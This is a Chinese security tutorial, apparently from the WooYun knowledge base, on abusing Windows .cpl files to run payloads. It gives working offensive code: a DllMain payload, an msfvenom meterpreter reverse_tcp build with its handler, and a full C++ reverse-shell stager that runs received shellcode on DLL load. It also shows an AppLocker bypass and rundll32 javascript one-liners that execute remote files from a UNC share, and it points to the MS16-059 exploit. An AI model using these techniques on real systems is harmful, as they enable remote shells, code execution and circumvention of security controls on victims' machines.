# CPL文件利用介绍

0x00 前言
=======

* * *

最近在研究`Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)`的过程中接触到了cpl文件，于是对其做了进一步研究，发现了一些有趣的细节，分享给大家。

0x01 简介
=======

* * *

CPL文件，是Windows控制面板扩展项，CPL全拼为`Control Panel Item`  
在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目  
CPL文件本质是Windows可执行性文件，但不属于可以直接独立运行的文件，通常由shell32.dll打开

0x02 制作CPL文件
============

* * *

1、文件特点
------

本质上是DLL文件，但有如下特点：

*   后缀名为cpl
*   包含一个导出函数CPLApplet
*   可双击直接运行

2、打开方式
------

**(1) 双击直接运行**

**(2) cmd下输入`rundll32 shell32.dll,Control_RunDLL <文件名>`**

**(3) cmd下输入`control <文件名>`**

**注：**  
cmd下`rundll32 shell32.dll,Control_RunDLL <文件名>`等同于cmd下`control <文件名>`  
control.exe实质调用了rundll32.exe，通过control.exe执行cpl文件的进程为rundll32.exe

**(4) 通过脚本调用**  
**a、**vbs

```
Dim obj
Set obj = CreateObject("Shell.Application")
obj.ControlPanelItem("test.cpl")

```

**b、**js

```
var a = new ActiveXObject("Shell.Application");
a.ControlPanelItem("c:\\test\\test.cpl");

```

3、使用vc 6.0制作标准cpl模板
-------------------

由文件特点可知，cpl本质就是一个dll文件  
所以我们可以在vc下创建一个dll的工程，并定义导出函数为CPlApplet

```
LRESULT APIENTRY CPlApplet
(
    HWND    aHwndCPL_in,    // Handle to Configuration Panel window.
    UINT    aUMsg_in,        // CPL message.
    LPARAM    aLParam1_in,    // First message parameter.
    LPARAM  aLParam2_in    // Second message parameter.
) 

```

值得注意的是aUMsg_in里面定义了一些CPL相关的参数：

```
                   | Return            | Return
CPL message        | if successfully   | if not successfully
-------------------+-------------------+--------------------
CPL_INIT           | nonzero           | zero
CPL_GETCOUNT       | nonzero           | zero
CPL_NEWINQUIRE     | zero              | nonzero
CPL_SELECT         | zero              | nonzero
CPL_DBLCLK         | zero              | nonzero
CPL_STOP           | zero              | nonzero
CPL_EXIT           | zero              | nonzero

```

图表来自http://www.codeproject.com/Articles/3026/Creating-a-Config-Panel-Applet

**CPL_INIT：**  
进行全局初始化

**CPL_GETCOUNT：**  
检索应用程序支持的对话框的数目  
返回值：支持的对话框数目

**CPL_NEWINQUIRE：**  
请求该应用程序支持的对话框的请求信息

**CPL_SELECT：**  
设置当用户选择一个对话框时显示的图标

**CPL_DBLCLK：**  
设置当用户双击一个对话框时显示的图标

**CPL_STOP：**  
控制面板关闭时向每个对话框发出的消息

**CPL_EXIT：**  
释放内存，退出

以上仅对相关函数作简要介绍，详细说明可查msdn，提供一个可供参考的工程模板：  
http://www.vbforums.com/attachment.php?s=7ebc3a64c985f675615a3e9d0aa350e8&attachmentid=286&d=981822351

**注：**  
函数注释的语言为斯洛文尼亚语，但不影响我们的程序开发  
模板下载后可直接编译出一个cpl文件，双击正常执行

4、简单粗暴的方式制作cpl文件
----------------

新建一个标准dll工程，在`DLL_PROCESS_ATTACH`中添加payload 相关代码之下：

```
#include "Windows.h"
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            WinExec("cmd", SW_SHOW);
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

```

编译后生成的dll文件后缀名改为cpl即可

如图

![Alt text](http://drops.javaweb.org/uploads/images/e7c8023f6d819e987f2458dfd5bb42a84b1c5d63.jpg)

点击后弹出cmd，但是退出后会弹框提示程序兼容性问题  
如果是管理员权限的cmd，运行的程序结束后就不会弹框  
**(此问题的解决方法放在后面介绍)**

0x03 测试
=======

* * *

由以上内容可推断只要将payload写在DllMain()函数中，就可以直接修改dll后缀名为cpl，然后通过双击来运行  
所以自然而然的想到了测试一下meterpreter是否支持这种方式

**生成test.cpl：**

```
msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o test.cpl

```

**msf：**

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.127.132
set LPORT 8888
exploit

```

双击test.cpl后弹回meterpreter shell  
但是同样在退出的时候会弹框提示程序兼容性助手

0x04 解决问题
=========

* * *

1、正常dll执行后弹框
------------

经过测试发现，原有是因为vc6.0的版本低导致的程序兼容问题  
所以换在vs2008(或者更新的版本)下开发就不会存在这个问题

如图

![Alt text](http://drops.javaweb.org/uploads/images/cd72e44881f77c79f0e28f206f2427a92e9abbe9.jpg)

2、解决meterpreter弹框的问题
--------------------

这里不深入探究msfvenom的生成方式，解决方法为使用c++程序自己编写一个meterpreter的reverse_tcp版本  
**关键代码：**

```
#include "Windows.h"
#include <WinSock2.h>
#include <stdio.h>  

#pragma comment(lib,"WS2_32.lib")   

int reverse_tcp()
{
    WSADATA wsData;
        if(WSAStartup(MAKEWORD(2,2),&wsData))
        {
            printf("WSAStartp fail.\n");
            return 0;
        } 

        SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
        SOCKADDR_IN server;
        ZeroMemory(&server,sizeof(SOCKADDR_IN));
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr("192.168.127.132"); //server ip
        server.sin_port = htons(8888); //server port
        if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&server,sizeof(server)))
        {
            printf("connect to server fail.\n");
            closesocket(sock);
            WSACleanup();
            return 0;
        } 

        u_int payloadLen;
        if (recv(sock,(char*)&payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))
        {
            printf("recv error\n");
            closesocket(sock);
            WSACleanup();
            return 0;
        } 

        char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        char* buffer = orig_buffer;
        int ret = 0;
        do 
        {
            ret = recv(sock,buffer,payloadLen,0);
            buffer += ret;
            payloadLen -= ret;
        } while (ret > 0 && payloadLen > 0);  


        __asm
        {
            mov edi,sock;   
            jmp orig_buffer; 
        } 

        VirtualFree(orig_buffer,0,MEM_RELEASE);   


}   

BOOL APIENTRY DllMain( HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved
                      )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        reverse_tcp();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

生成dll文件，后缀名改为cpl  
正常运行，正常退出

0x05 Bypass Windows AppLocker
=============================

* * *

之前介绍过《Bypass Windows AppLocker》  
开启默认规则后会拦截exe和脚本的执行，那么cpl文件呢？  
当然可以绕过 Windows AppLocker的限制规则

如图

![Alt text](http://drops.javaweb.org/uploads/images/9bc1fe87fcfefed8c7a12ba6f4a7efd6249f0c17.jpg)

0x06 rundll32
=============

* * *

补充一些rundll32调用js代码的细节;

**执行远程exe,会弹框拦截：**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("\\\\127.0.0.1\\c$\\test\\test.exe")

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/623040b862e2f5cda9f164fc89c6e89910d48da0.jpg)

**解决方法：**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\test.exe")

```

如图![Alt text](http://drops.javaweb.org/uploads/images/2b9db29a8ecd59d044334126bf32ae6af5b182c0.jpg)

**执行本地cpl文件，会弹框提示无法识别文件后缀名：**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("c:\\test\\cpl.cpl")

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/211f1aee8fc238d336613399129384704d4f85eb.jpg)

**解决方法：**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c c:\\test\\cpl.cpl",0,true)

```

**遗留问题：**

**1、无法调用Shell.Application直接执行cpl文件：**

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new20%ActiveXObject("Shell.Application").ControlPanelItem("c:\\test\\cpl.cpl")

```

**2、无法远程调用cpl文件**

无法识别文件后缀：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\cpl.cpl")

```

弹框拦截远程文件：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("cmd /c \\\\127.0.0.1\\c$\\test\\cpl.cpl")

```

and

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c \\\\127.0.0.1\\c$\\test\\cpl.cpl",0,true)

```

如果你有解决办法或是更好的思路，希望能够分享，不胜感激。

0x07 Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)
===========================================================================================

* * *

下载链接：[https://www.exploit-db.com/exploits/39805/](https://www.exploit-db.com/exploits/39805/)

将定制的快捷方式放于任意路径，本地或是远程，当用户访问此目录的时候，就会执行payload  
演示的远程路径为：`\\127.0.0.1\c$\test\poc`（正常情况下访问此目录也会当作远程目录被沙盒拦截）

poc演示如图，访问远程目录`\\127.0.0.1\c$\test\poc`并绕过沙盒拦截，成功执行payload

![Alt text](http://drops.javaweb.org/uploads/images/728a300b82096ccbc11bebf292a7116c56bbfb77.jpg)

©乌云知识库版权所有 未经许可 禁止转载